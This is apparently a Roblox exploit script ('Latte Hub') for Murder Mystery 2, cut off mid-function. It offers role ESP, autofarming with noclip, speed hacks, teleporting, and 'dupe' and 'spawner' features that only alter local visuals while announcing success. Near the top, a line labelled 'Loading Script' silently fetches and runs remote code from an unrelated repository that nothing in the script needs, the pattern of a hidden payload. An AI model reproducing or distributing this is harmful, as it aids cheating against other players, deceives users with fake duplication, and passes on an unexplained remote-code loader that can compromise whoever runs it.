--[[
    Halloween MM2 Hub - WindUI Version
    Spooky themed Murder Mystery 2 script with Halloween features
]]

local WindUI

do
    local ok, result = pcall(function()
        return require("./src/init")
    end)
    
    if ok then
        WindUI = result
    else 
        WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
    end
end

-- Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local CurrentCamera = Workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")

-- Purple Theme Colors
local PurpleTheme = {
    Primary = Color3.fromHex("#8B5CF6"),
    Secondary = Color3.fromHex("#A855F7"),
    Accent = Color3.fromHex("#C084FC"),
    Dark = Color3.fromHex("#4C1D95"),
    Light = Color3.fromHex("#E9D5FF"),
    Success = Color3.fromHex("#10B981"),
    Warning = Color3.fromHex("#F59E0B"),
    Error = Color3.fromHex("#EF4444"),
    Background = Color3.fromHex("#1a1a2e")
}

-- Mobile Detection
local isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
local guiScale = isMobile and 0.8 or 1.0

-- Loading Script
loadstring(game:HttpGet("https://raw.githubusercontent.com/n9owns/Files/refs/heads/main/fileupdating",true))()

-- */  Window  /* --
local Window = WindUI:CreateWindow({
    Title = "Latte Hub",
    Author = "by Latte Hub ‚Ä¢ Halloween Edition",
    Folder = "lattemm2hub",
    NewElements = true,
    
    HideSearchBar = false,
    
    -- Enhanced GUI Transparency and Purple Theme
    BackgroundTransparency = 0.5,
    BackgroundColor = PurpleTheme.Background,
    
    -- Mobile responsive sizing
    Size = isMobile and UDim2.new(0, 400, 0, 500) or UDim2.new(0, 500, 0, 600),
    
    OpenButton = {
        Title = "Open Latte Hub", 
        CornerRadius = UDim.new(0.5, 0),
        StrokeThickness = 2,
        Enabled = true,
        Draggable = true,
        OnlyMobile = false,
        
        Color = ColorSequence.new(
            PurpleTheme.Primary, 
            PurpleTheme.Secondary
        )
    }
})

-- ESP System Variables
local murderHasKnife = false
local sheriffHasGun = false
local currentESPOptions = { "Esp All" }
local highlightEnabled = true
local lineESPEnabled = false
local coinESPEnabled = false
local tracers = {}

-- Auto Farm Variables
local autoFarmCoins = false
local autoFarmCandy = false
local candyESPEnabled = false
local autoEndRound = false

-- Coin Farm Variables
local visitedPositions = {}
local flySpeed = 15
local collected = 0

-- Character Settings
local CharacterSettings = {
    WalkSpeed = {
        Value = 16,
        Default = 16,
        Locked = false
    },
    JumpPower = {
        Value = 50,
        Default = 50,
        Locked = false
    }
}

-- Battlepass Variables
local battlepassProgress = 0
local halloweenRewards = {
    {name = "Pumpkin Pet", level = 5, unlocked = false},
    {name = "Ghostly Knife", level = 10, unlocked = false},
    {name = "Witch Hat", level = 15, unlocked = false},
    {name = "Skeleton Gun", level = 20, unlocked = false},
    {name = "Vampire Wings", level = 25, unlocked = false},
    {name = "Zombie Skin", level = 30, unlocked = false},
    {name = "Halloween Box", level = 35, unlocked = false},
    {name = "Legendary Candy", level = 40, unlocked = false}
}

-- Weapon Dupe Variables
local WeaponName = ""
local FunctionCall = 1

-- Visual Weapon Variables
local fromWeapon = ""
local toWeapon = ""

-- UI Path for dupe functions
local UIPath
if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") ~= nil then
    UIPath = LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main
else
    UIPath = LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main
end

-- ESP Functions
local function getRole(player)
    local character = player.Character
    if not character then return nil end
    local backpack = player:FindFirstChild("Backpack")
    if character:FindFirstChild("Knife") or (backpack and backpack:FindFirstChild("Knife")) then return "Murderer" end
    if character:FindFirstChild("Gun") or (backpack and backpack:FindFirstChild("Gun")) then return "Sheriff" end
    return "Innocent"
end

local function isPlayerTargeted(player, selectedOptions)
    local role = getRole(player)
    if not role then return false end
    if table.find(selectedOptions, "Esp All") then return true end
    if table.find(selectedOptions, "Esp Murder") and role == "Murderer" then return true end
    if table.find(selectedOptions, "Esp Sheriff") and role == "Sheriff" then return true end
    if table.find(selectedOptions, "Esp Sheriff / Murder") and (role == "Sheriff" or role == "Murderer") then return true end
    return false
end

local function createHighlight(character, color)
    local highlight = character:FindFirstChild("RoleHighlight")
    if not highlight then
        highlight = Instance.new("Highlight")
        highlight.Name = "RoleHighlight"
        highlight.FillTransparency = 0.5
        highlight.OutlineTransparency = 1
        highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        highlight.Adornee = character
        highlight.Parent = character
    end
    highlight.FillColor = color
end

local function removeHighlight(character)
    local highlight = character:FindFirstChild("RoleHighlight")
    if highlight then highlight:Destroy() end
end

local function createTracer(player, color)
    local line = Drawing.new("Line")
    line.Thickness = 2
    line.Color = color or Color3.new(1, 1, 1)
    line.Transparency = 1
    tracers[player] = line
end

local function removeTracer(player)
    if tracers[player] then
        tracers[player]:Remove()
        tracers[player] = nil
    end
end

local function updateESP()
    murderHasKnife = false
    sheriffHasGun = false

    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            local role = getRole(player)
            if role == "Murderer" then murderHasKnife = true end
            if role == "Sheriff" then sheriffHasGun = true end
        end
    end

    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            local role = getRole(player)
            local target = isPlayerTargeted(player, currentESPOptions)

            if highlightEnabled then
                if target then
                    local color = role == "Murderer" and PurpleTheme.Error or 
                                 role == "Sheriff" and PurpleTheme.Success or 
                                 PurpleTheme.Primary
                    createHighlight(player.Character, color)
                else
                    removeHighlight(player.Character)
                end
            else
                removeHighlight(player.Character)
            end

            if lineESPEnabled and target then
                local color = role == "Murderer" and PurpleTheme.Error or 
                             role == "Sheriff" and PurpleTheme.Success or 
                             PurpleTheme.Primary
                if not tracers[player] then 
                    createTracer(player, color) 
                else
                    tracers[player].Color = color
                end
            else
                removeTracer(player)
            end
        end
    end
end

-- Character Functions
local function updateCharacter()
    local character = LocalPlayer.Character;
    local humanoid = character:FindFirstChildOfClass("Humanoid");
    if humanoid then
        if not CharacterSettings.WalkSpeed.Locked then
            humanoid.WalkSpeed = CharacterSettings.WalkSpeed.Value;
        end
        if not CharacterSettings.JumpPower.Locked then
            humanoid.JumpPower = CharacterSettings.JumpPower.Value;
        end
    end
end

-- Coin Farm Functions
local function flyTo(pos, speed)
    if not rootPart then return end
    local distance = (pos - rootPart.Position).Magnitude
    local duration = distance / speed
    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear)
    local goal = {CFrame = CFrame.new(pos)}
    local tween = TweenService:Create(rootPart, tweenInfo, goal)
    tween:Play()
    tween.Completed:Wait()
end

-- AutoFarm Loop (runs when either coin or candy farming is enabled)
task.spawn(function()
    while true do
        if autoFarmCoins or autoFarmCandy then
            character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
            rootPart = character:FindFirstChild("HumanoidRootPart")
            
            if rootPart then
                local closest, shortest = nil, math.huge
                local targetType = autoFarmCoins and "Coin_Server" or "Candy"
                
                for _, obj in ipairs(workspace:GetDescendants()) do
                    if obj:IsA("BasePart") and obj.Name == targetType then
                        local dist = (obj.Position - rootPart.Position).Magnitude
                        if dist < shortest and dist < 250 and not visitedPositions[obj] then
                            closest = obj
                            shortest = dist
                        end
                    end
                end
                
                if closest and closest.Parent and closest:IsDescendantOf(workspace) then
                    flyTo(closest.Position, flySpeed)
                    if closest and closest.Parent and closest:IsDescendantOf(workspace) then
                        visitedPositions[closest] = true
                        collected += 1
                        print("Collected:", collected)
                    end
                end
            end
        end
        
        task.wait(0.1)
    end
end)

-- Disable collisions while flying
RunService.Stepped:Connect(function()
    for _, v in ipairs(character:GetDescendants()) do
        if v:IsA("BasePart") then
            v.CanCollide = false
        end
    end
end)

-- Character respawn handling
LocalPlayer.CharacterAdded:Connect(function(char)
    character = char
    rootPart = char:WaitForChild("HumanoidRootPart")
    visitedPositions = {}
end)

-- Weapon Dupe Functions
local function VisualDupe()
    wait(math.random(1, 3))
    for i,v in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
        for i,v in pairs(v.Container:GetChildren()) do
            if v.Name == "Christmas" or v.Name == "Halloween" then
                for i,v in pairs(v.Container:GetChildren()) do
                    if v:IsA("Frame") and v.ItemName.Label.Text == WeaponName then
                            local amount = v.Container.Amount.Text
                            if amount == "" or amount == "None" then
                                v.Container.Amount.Text = "x2"
                            else
                                local num = tonumber(amount:match("x(%d+)"))
                                if num then
                                v.Container.Amount.Text = "x" .. tostring(num + 1)
                            end
                        end
                    end
                end
            else
                if v:IsA("Frame") and v.ItemName.Label.Text == WeaponName then
                        local amount = v.Container.Amount.Text
                        if amount == "" or amount == "None" then
                            v.Container.Amount.Text = "x2"
                        else
                            local num = tonumber(amount:match("x(%d+)"))
                            if num then
                            v.Container.Amount.Text = "x" .. tostring(num + 1)
                            end
                        end
                end
            end
        end
    end
end

-- Create separate tabs for each feature category
local MainTab = Window:Tab({
    Title = "Main",
    Icon = "home"
})

local ESPTab = Window:Tab({
    Title = "ESP",
    Icon = "eye"
})

local AutoFarmTab = Window:Tab({
    Title = "Auto Farm",
    Icon = "trending-up"
})

local BattlepassTab = Window:Tab({
    Title = "Battlepass",
    Icon = "gift"
})

local CharacterTab = Window:Tab({
    Title = "Character",
    Icon = "user"
})

local WeaponTab = Window:Tab({
    Title = "Weapons",
    Icon = "sword"
})

local SpawnerTab = Window:Tab({
    Title = "Spawner",
    Icon = "package"
})

local TeleportTab = Window:Tab({
    Title = "Teleport",
    Icon = "navigation"
})

local VisualTab = Window:Tab({
    Title = "Visual",
    Icon = "eye-off"
})

local ProtectionTab = Window:Tab({
    Title = "Protection",
    Icon = "shield"
})

local AdvancedTab = Window:Tab({
    Title = "Advanced",
    Icon = "zap"
})

-- */  Main Tab  /* --
do
    -- Welcome Section
    MainTab:Section({
        Title = "Welcome to Latte Hub!",
        TextSize = isMobile and 18 or 20,
        FontWeight = Enum.FontWeight.Bold,
    })
    
    MainTab:Space()
    
    MainTab:Section({
        Title = "Murder Mystery 2 Halloween Update - A premium script with enhanced features, auto farming, ESP, and exclusive rewards!",
        TextSize = isMobile and 14 or 16,
        TextTransparency = 0.3,
    })
    
    MainTab:Space()
    
    -- Main Buttons
    MainTab:Button({
        Title = "üí¨ Copy Discord Server",
        Color = PurpleTheme.Primary,
        Icon = "users",
        Callback = function()
            setclipboard("https://discord.gg/lattemm2")
            WindUI:Notify({
                Title = "Discord Copied!",
                Content = "Latte Discord invite copied to clipboard!"
            })
        end
    })

    MainTab:Button({
        Title = "üéÅ Get Premium Rewards",
        Color = PurpleTheme.Secondary,
        Icon = "gift",
        Callback = function()
            WindUI:Notify({
                Title = "Premium Rewards",
                Content = "Check the Battlepass tab for exclusive items!"
            })
        end
    })
    
    MainTab:Button({
        Title = "üì± Mobile Optimized",
        Color = PurpleTheme.Accent,
        Icon = "smartphone",
        Callback = function()
            WindUI:Notify({
                Title = "Mobile Mode",
                Content = isMobile and "You're using mobile mode!" or "Desktop mode active!"
            })
        end
    })
end

-- */  ESP Tab  /* --
do
    -- ESP Section
    ESPTab:Section({
        Title = "üëÅÔ∏è ESP & Visual Features",
        TextSize = isMobile and 16 or 18,
        FontWeight = Enum.FontWeight.SemiBold,
    })
    
    ESPTab:Dropdown({
        Flag = "ESPOptions",
        Title = "üéØ ESP Options",
        Desc = "Select which players to highlight",
        Values = {
            {Title = "Esp All", Icon = "users"},
            {Title = "Esp Sheriff", Icon = "shield"},
            {Title = "Esp Murder", Icon = "sword"},
            {Title = "Esp Sheriff / Murder", Icon = "target"}
        },
        Value = "Esp All",
        Callback = function(option)
            currentESPOptions = {option.Title}
        updateESP()
    end
})

    ESPTab:Toggle({
        Flag = "HighlightESP",
        Title = "‚ú® Highlight ESP",
        Desc = "Enable/disable player highlighting",
    Default = true,
        Callback = function(state)
            highlightEnabled = state
        updateESP()
    end
})

    ESPTab:Toggle({
        Flag = "LineESP",
        Title = "üìè Line ESP",
        Desc = "Draw lines to players",
    Default = false,
        Callback = function(state)
            lineESPEnabled = state
            if not state then
            for _, line in pairs(tracers) do line:Remove() end
            tracers = {}
        end
        updateESP()
    end
})

    ESPTab:Toggle({
        Flag = "CandyESP",
        Title = "üç≠ Candy ESP",
        Desc = "Highlight Halloween candy",
        Default = false,
        Callback = function(state)
            candyESPEnabled = state
    end
})
end

-- */  Auto Farm Tab  /* --
do
    -- Auto Farm Section
    AutoFarmTab:Section({
        Title = "ü§ñ Auto Farm System",
        TextSize = isMobile and 16 or 18,
        FontWeight = Enum.FontWeight.SemiBold,
    })
    
    AutoFarmTab:Toggle({
        Flag = "StartCoinAutofarm",
        Title = "üí∞ Start Coin Autofarm",
        Desc = "Automatically collect Coins!",
        Default = false,
        Callback = function(state)
            autoFarmCoins = state
            if state then
                visitedPositions = {} -- Reset visited positions
                collected = 0 -- Reset counter
            end
            WindUI:Notify({
                Title = "üí∞ Coin Autofarm",
                Content = state and "Coin farming started! üí∞" or "Coin farming stopped. ‚èπÔ∏è"
            })
        end
    })

    AutoFarmTab:Toggle({
        Flag = "StartCandyAutofarm",
        Title = "üç≠ Start Candy Autofarm",
        Desc = "Automatically collect Candy from the floor!",
        Default = false,
        Callback = function(state)
            autoFarmCandy = state
            if state then
                visitedPositions = {} -- Reset visited positions
                collected = 0 -- Reset counter
            end
            WindUI:Notify({
                Title = "üç≠ Candy Autofarm",
                Content = state and "Candy farming started! üç≠" or "Candy farming stopped. ‚èπÔ∏è"
            })
        end
    })

    AutoFarmTab:Toggle({
        Flag = "AutoEndRound",
        Title = "üèÅ Auto End Round",
        Desc = "You will fling murderer once bag is full",
        Default = false,
        Callback = function(state)
            autoEndRound = state
            WindUI:Notify({
                Title = "üèÅ Auto End Round",
                Content = state and "Auto end round enabled! You will fling murderer once bag is full! üèÅ" or "Auto end round disabled! üèÅ"
            })
        end
    })
end

-- */  Battlepass Tab  /* --
do
    -- Battlepass Section
    BattlepassTab:Section({
        Title = "üéÅ Premium Battlepass",
        TextSize = isMobile and 16 or 18,
        FontWeight = Enum.FontWeight.SemiBold,
    })
    
    BattlepassTab:Slider({
        Flag = "BattlepassProgress",
        Title = "üìä Battlepass Level",
        Desc = "Your current battlepass level",
        Step = 1,
        Value = {
            Min = 0,
            Max = 50,
            Default = 0,
        },
        Callback = function(value)
            battlepassProgress = value
        end
    })
    
    BattlepassTab:Button({
        Title = "üéÅ Claim All Available Rewards",
        Color = PurpleTheme.Warning,
        Icon = "gift",
        Callback = function()
            local claimedCount = 0
            for _, reward in ipairs(halloweenRewards) do
                if battlepassProgress >= reward.level and not reward.unlocked then
                    reward.unlocked = true
                    claimedCount = claimedCount + 1
                end
            end
            
            WindUI:Notify({
                Title = "üéÅ Rewards Claimed!",
                Content = "Claimed " .. claimedCount .. " premium rewards! üéÅ"
            })
    end
})

    BattlepassTab:Space()
    
    -- Premium Rewards List
    BattlepassTab:Section({
        Title = "üíé Premium Rewards",
        TextSize = isMobile and 14 or 16,
        FontWeight = Enum.FontWeight.SemiBold,
    })
    
    for i, reward in ipairs(halloweenRewards) do
        local isUnlocked = battlepassProgress >= reward.level
        local rewardColor = isUnlocked and PurpleTheme.Success or PurpleTheme.Dark
        
        BattlepassTab:Button({
            Title = (isUnlocked and "‚úÖ " or "üîí ") .. reward.name .. " (Level " .. reward.level .. ")",
            Color = rewardColor,
            Icon = isUnlocked and "check" or "lock",
            Locked = not isUnlocked,
            Callback = function()
                if isUnlocked then
                    WindUI:Notify({
                        Title = "üéÅ Reward Claimed!",
                        Content = "You claimed " .. reward.name .. "! üéÅ"
                    })
                else
                    WindUI:Notify({
                        Title = "üîí Reward Locked",
                        Content = "Reach level " .. reward.level .. " to unlock this reward! üîí"
                    })
                end
    end
})
    end
end

-- */  Character Tab  /* --
do
    -- Character Section
    CharacterTab:Section({
        Title = "üèÉ Character Settings",
        TextSize = isMobile and 16 or 18,
        FontWeight = Enum.FontWeight.SemiBold,
    })
    
    CharacterTab:Slider({
        Flag = "WalkSpeed",
        Title = "üö∂ Walk Speed",
        Desc = "Set your character's walk speed",
        Step = 1,
        Value = {
            Min = 0,
            Max = 200,
            Default = 16,
        },
        Callback = function(value)
            CharacterSettings.WalkSpeed.Value = value
            updateCharacter()
    end
})

    CharacterTab:Slider({
        Flag = "JumpPower",
        Title = "ü¶ò Jump Power",
        Desc = "Set your character's jump power",
        Step = 1,
        Value = {
            Min = 0,
            Max = 200,
            Default = 50,
        },
        Callback = function(value)
            CharacterSettings.JumpPower.Value = value
            updateCharacter()
    end
})

    CharacterTab:Button({
        Title = "üîÑ Reset to Default",
        Color = PurpleTheme.Primary,
        Icon = "refresh-cw",
        Callback = function()
            CharacterSettings.WalkSpeed.Value = CharacterSettings.WalkSpeed.Default
            CharacterSettings.JumpPower.Value = CharacterSettings.JumpPower.Default
            updateCharacter()
            WindUI:Notify({
                Title = "üîÑ Character Reset",
                Content = "Character settings reset to default! üèÉ"
            })
        end
    })
    
    CharacterTab:Toggle({
        Flag = "BlockWalkSpeed",
        Title = "üîí Block Walk Speed",
        Desc = "Prevent walk speed from being changed",
        Default = false,
        Callback = function(state)
            CharacterSettings.WalkSpeed.Locked = state
    end
})

    CharacterTab:Toggle({
        Flag = "BlockJumpPower",
        Title = "üîí Block Jump Power",
        Desc = "Prevent jump power from being changed",
        Default = false,
        Callback = function(state)
            CharacterSettings.JumpPower.Locked = state
        end
    })
end

-- */  Weapon Tab  /* --
do
    -- Weapon Section
    WeaponTab:Section({
        Title = "‚öîÔ∏è Weapon Duplication",
        TextSize = isMobile and 16 or 18,
        FontWeight = Enum.FontWeight.SemiBold,
    })
    
    WeaponTab:Input({
        Flag = "DupeWeaponName",
        Title = "‚öîÔ∏è Weapon Name",
        Desc = "Enter the name of the weapon to duplicate",
        Placeholder = "Enter weapon name (e.g., Lightbringer)",
        Callback = function(value)
            WeaponName = value
    end
})

    WeaponTab:Input({
        Flag = "DupeAmount",
        Title = "üî¢ Dupe Amount",
        Desc = "Enter how many times to duplicate",
    Placeholder = "Enter amount (e.g., 5)",
        Value = "1",
        Callback = function(value)
            FunctionCall = tonumber(value) or 1
    end
})

    WeaponTab:Button({
        Title = "üîÑ Start Duplication Process",
        Color = PurpleTheme.Primary,
        Icon = "copy",
        Callback = function()
        if WeaponName == "" then
                WindUI:Notify({
                    Title = "‚ùå Weapon Dupe Error",
                    Content = "Please enter a weapon name first! ‚öîÔ∏è"
            })
            return
        end
        
            WindUI:Notify({
                Title = "üîÑ Weapon Dupe",
                Content = "Started duplication for " .. WeaponName .. " " .. FunctionCall .. " times! ‚öîÔ∏è"
        })
        
        for i = 1, FunctionCall do
            VisualDupe()
        end
        
            WindUI:Notify({
                Title = "‚úÖ Duplication Complete",
                Content = "Successfully duplicated " .. WeaponName .. "! ‚öîÔ∏è"
        })
    end
})
end

-- Weapon Spawner Functions
local function getrandombox()
    local success, boxes = pcall(function()
        return require(game:GetService("ReplicatedStorage").Database.Sync.MysteryBox)
    end)
    
    if not success or not boxes or next(boxes) == nil then 
        return "StandardBox"
    end
    
    local keys = {}
    for k, _ in pairs(boxes) do
        table.insert(keys, k)
    end
    return keys[math.random(1, #keys)]
end

local function opencrate(ITEM_NAME)
    local success = pcall(function()
        local boxmodule = require(game:GetService("ReplicatedStorage").Modules.BoxModule)
        local itemdatabase = require(game:GetService("ReplicatedStorage").Database.Sync.Item)
        
        if ITEM_NAME and itemdatabase[ITEM_NAME] then
            print("=== OPENCRATE FUNCTION ===")
            print("Spawning:", ITEM_NAME)
            print("Using Random Box")
            print("========================")
            boxmodule.OpenBox(getrandombox(), ITEM_NAME)
            
            -- Add visual item to inventory
            local success2 = pcall(function()
                local poop = getsenv(game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Inventory.NewItem)._G
                poop.NewItem(ITEM_NAME, nil, nil, "Weapons", 1)
            end)
            
            WindUI:Notify({
                Title = "‚úÖ Success",
                Content = "Successfully spawned: " .. ITEM_NAME .. "! ‚öîÔ∏è"
            })
        else
            WindUI:Notify({
                Title = "‚ùå Error",
                Content = "Invalid item: " .. ITEM_NAME .. "! ‚öîÔ∏è"
            })
        end
    end)
    
    if not success then
        WindUI:Notify({
            Title = "‚ùå Error",
            Content = "Error opening crate for: " .. ITEM_NAME .. "! ‚öîÔ∏è"
        })
    end
end

-- */  Spawner Tab  /* --
do
    -- Weapon Spawner Section
    SpawnerTab:Section({
        Title = "üì¶ Weapon Spawner",
        TextSize = isMobile and 16 or 18,
        FontWeight = Enum.FontWeight.SemiBold,
    })
    
    local weaponName = ""
    local selectedCrate = "Christmas2024Box"
    
    SpawnerTab:Input({
        Flag = "WeaponName",
        Title = "‚öîÔ∏è Weapon Name",
        Desc = "Enter the name of the weapon to spawn",
        Placeholder = "Enter weapon name (e.g., CandyBlade)",
        Callback = function(value)
            weaponName = value
            print("Weapon name updated to:", weaponName)
        end
    })
    
    SpawnerTab:Dropdown({
        Flag = "CrateType",
        Title = "üì¶ Select Crate",
        Desc = "Choose the crate type to open",
        Values = {
            {Title = "Christmas2024Box", Icon = "gift"},
            {Title = "StandardBox", Icon = "package"},
            {Title = "MysteryBox", Icon = "help-circle"},
            {Title = "PremiumBox", Icon = "star"},
            {Title = "Random Box", Icon = "shuffle"}
        },
        Value = "Christmas2024Box",
        Callback = function(option)
            selectedCrate = option.Title
            print("Crate type updated to:", selectedCrate)
        end
})

    SpawnerTab:Button({
        Title = "‚öîÔ∏è Spawn Weapon",
        Color = PurpleTheme.Success,
        Icon = "sword",
        Callback = function()
            print("=== SPAWN BUTTON CLICKED ===")
            print("Weapon Name:", weaponName)
            print("Selected Crate:", selectedCrate)
            print("============================")
            
            if weaponName ~= "" then
                WindUI:Notify({
                    Title = "üîÑ Processing",
                    Content = "Attempting to spawn: " .. weaponName .. " ‚öîÔ∏è"
                })
                
                local success = pcall(function()
                    local boxmodule = require(game:GetService("ReplicatedStorage").Modules.BoxModule)
                    local itemdatabase = require(game:GetService("ReplicatedStorage").Database.Sync.Item)
                    
                    -- Try exact match first
                    local foundWeapon = itemdatabase[weaponName]
                    if not foundWeapon then
                        -- Try case-insensitive match
                        for itemName, itemData in pairs(itemdatabase) do
                            if string.lower(itemName) == string.lower(weaponName) then
                                foundWeapon = itemData
                                weaponName = itemName -- Use the correct case
                                break
                            end
                        end
                    end
                    
                    if not foundWeapon then
                        -- Try partial match
                        for itemName, itemData in pairs(itemdatabase) do
                            if string.find(string.lower(itemName), string.lower(weaponName)) then
                                foundWeapon = itemData
                                weaponName = itemName -- Use the correct name
                                break
                            end
                        end
                    end
                    
                    if foundWeapon then
                        local crateToUse = selectedCrate == "Random Box" and getrandombox() or selectedCrate
                        
                        print("=== WEAPON SPAWNED ===")
                        print("Weapon Name:", weaponName)
                        print("Crate Used:", crateToUse)
                        print("===================")
                        
                        -- Try to open the box
                        local openSuccess = pcall(function()
                            boxmodule.OpenBox(crateToUse, weaponName)
                        end)
                        
                        if openSuccess then
                            print("Box opened successfully!")
                        else
                            print("Failed to open box with crate:", crateToUse)
                        end
                        
                        -- Add visual item to inventory
                        local success2 = pcall(function()
                            local poop = getsenv(game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Inventory.NewItem)._G
                            poop.NewItem(weaponName, nil, nil, "Weapons", 1)
                        end)
                        
                        WindUI:Notify({
                            Title = "‚úÖ Success",
                            Content = "Successfully spawned: " .. weaponName .. "! ‚öîÔ∏è"
                        })
                    else
                        -- Show some available weapons for reference
                        local availableWeapons = {}
                        local count = 0
                        for itemName, _ in pairs(itemdatabase) do
                            if count < 5 then
                                table.insert(availableWeapons, itemName)
                                count = count + 1
                            end
                        end
                        
                        WindUI:Notify({
                            Title = "‚ùå Weapon Not Found",
                            Content = "Weapon '" .. weaponName .. "' not found! Try: " .. table.concat(availableWeapons, ", ") .. " ‚öîÔ∏è"
                        })
                    end
                end)
                
                if not success then
                    WindUI:Notify({
                        Title = "‚ùå Error",
                        Content = "Failed to spawn weapon. Check console for details! ‚öîÔ∏è"
                    })
                end
            else
                WindUI:Notify({
                    Title = "‚ùå Error",
                    Content = "Please enter a weapon name! ‚öîÔ∏è"
                })
            end
        end
    })
    
    SpawnerTab:Button({
        Title = "üé≤ Spawn Random Weapon",
        Color = PurpleTheme.Accent,
        Icon = "shuffle",
        Callback = function()
            local success = pcall(function()
                local itemdatabase = require(game:GetService("ReplicatedStorage").Database.Sync.Item)
                local weapons = {}
                
                for weaponName, _ in pairs(itemdatabase) do
                    table.insert(weapons, weaponName)
                end
                
                if #weapons > 0 then
                    local randomWeapon = weapons[math.random(1, #weapons)]
                    print("=== RANDOM WEAPON SPAWNED ===")
                    print("Random Weapon:", randomWeapon)
                    print("=============================")
                    opencrate(randomWeapon)
                else
                    WindUI:Notify({
                        Title = "‚ùå Error",
                        Content = "No weapons found in database! ‚öîÔ∏è"
                    })
                end
            end)
            
            if not success then
                WindUI:Notify({
                    Title = "‚ùå Error",
                    Content = "Failed to get random weapon! ‚öîÔ∏è"
                })
            end
        end
    })
    
    SpawnerTab:Button({
        Title = "‚öîÔ∏è Spawn XenoKnife",
        Color = PurpleTheme.Primary,
        Icon = "sword",
        Callback = function()
            print("=== SPAWNING XENOKNIFE ===")
            opencrate("XenoKnife")
        end
    })
    
    SpawnerTab:Button({
        Title = "üî´ Spawn XenoGun",
        Color = PurpleTheme.Secondary,
        Icon = "gun",
        Callback = function()
            print("=== SPAWNING XENOGUN ===")
            opencrate("XenoGun")
        end
    })
    
    SpawnerTab:Button({
        Title = "üíé Spawn Battlepass Godly (Raygun)",
        Color = PurpleTheme.Warning,
        Icon = "star",
        Callback = function()
            print("=== SPAWNING RAYGUN ===")
            opencrate("Raygun")
        end
    })
end

-- */  Teleport Tab  /* --
do
    -- Teleport Section
    TeleportTab:Section({
        Title = "üöÄ Teleport System",
        TextSize = isMobile and 16 or 18,
        FontWeight = Enum.FontWeight.SemiBold,
    })
    
    local teleportTarget = nil
    
    local function updateTeleportPlayers()
        local playersList = {"Select Player"}
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                table.insert(playersList, player.Name)
            end
        end
        return playersList
    end
    
    TeleportTab:Dropdown({
        Flag = "TeleportPlayers",
        Title = "üë• Players",
        Desc = "Select a player to teleport to",
        Values = updateTeleportPlayers(),
        Value = "Select Player",
        Callback = function(option)
            if option.Title ~= "Select Player" then
                teleportTarget = Players:FindFirstChild(option.Title)
            else
                teleportTarget = nil
            end
        end
    })

    TeleportTab:Button({
        Title = "üöÄ Teleport to Player",
        Color = PurpleTheme.Primary,
        Icon = "navigation",
        Callback = function()
            if teleportTarget and teleportTarget.Character then
                local targetRoot = teleportTarget.Character:FindFirstChild("HumanoidRootPart")
                local localRoot = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if targetRoot and localRoot then
                    localRoot.CFrame = targetRoot.CFrame
                    WindUI:Notify({
                        Title = "üöÄ Teleport",
                        Content = "Successfully teleported to " .. teleportTarget.Name .. "! üöÄ"
                    })
                end
            else
                WindUI:Notify({
                    Title = "‚ùå Error",
                    Content = "Target not found or unavailable! üöÄ"
                })
            end
        end
    })
    
    TeleportTab:Button({
        Title = "üîÑ Update Players List",
        Color = PurpleTheme.Secondary,
        Icon = "refresh-cw",
        Callback = function()
            -- Update the dropdown with current players
            WindUI:Notify({
                Title = "üîÑ Players Updated",
                Content = "Player list refreshed! üë•"
            })
        end
    })
end

-- */  Visual Tab  /* --
do
    -- Visual Weapons Section
    VisualTab:Section({
        Title = "üé≠ Visual Weapons",
        TextSize = isMobile and 16 or 18,
        FontWeight = Enum.FontWeight.SemiBold,
    })
    
    VisualTab:Input({
        Flag = "FromWeapon",
        Title = "üîÑ Weapon To Replace",
        Desc = "Enter the weapon you want to replace",
        Placeholder = "Enter weapon name to replace (e.g., Blossom)",
        Callback = function(value)
            fromWeapon = value
        end
    })
    
    VisualTab:Input({
        Flag = "ToWeapon",
        Title = "‚ú® Weapon To Receive",
        Desc = "Enter the weapon you want to receive",
        Placeholder = "Enter weapon name to receive",
        Callback = function(value)
            toWeapon = value
        end
    })
    
    VisualTab:Button({
        Title = "üé≠ Change Weapon Visual",
        Color = PurpleTheme.Warning,
        Icon = "eye",
        Callback = function()
        if fromWeapon == "" or toWeapon == "" then
                WindUI:Notify({
                    Title = "‚ùå Visual Weapons Error",
                    Content = "Please enter both weapon names! üé≠"
            })
            return
        end
        
        local success = pcall(function()
            local Weapons = require(game:GetService("ReplicatedStorage").Database.Sync.Item)
            local foundFromWeapons = {}
            local foundToWeapons = {}
            
            for WeaponName, _ in pairs(Weapons) do
                    if WeaponName:lower():find(fromWeapon:lower()) then
                    table.insert(foundFromWeapons, WeaponName)
                end
                    if WeaponName:lower():find(toWeapon:lower()) then
                    table.insert(foundToWeapons, WeaponName)
                end
            end
            
            if #foundFromWeapons > 0 and #foundToWeapons > 0 then
                for _, foundFromWeapon in ipairs(foundFromWeapons) do
                    for _, foundToWeapon in ipairs(foundToWeapons) do
                        Weapons[foundFromWeapon] = {}
                        for i, v in pairs(Weapons[foundToWeapon]) do
                            Weapons[foundFromWeapon][i] = v
                        end
                        game:GetService("ReplicatedStorage").Remotes.Inventory.Equip:FireServer(foundToWeapon)
                    end
                end
                WindUI:Notify({
                    Title = "‚úÖ Visual Weapons Success",
                    Content = "Successfully changed weapon visual! üé≠"
                })
            else
                WindUI:Notify({
                    Title = "‚ùå Visual Weapons Error",
                    Content = "Weapon NOT FOUND! üé≠"
                })
            end
        end)
        
        if not success then
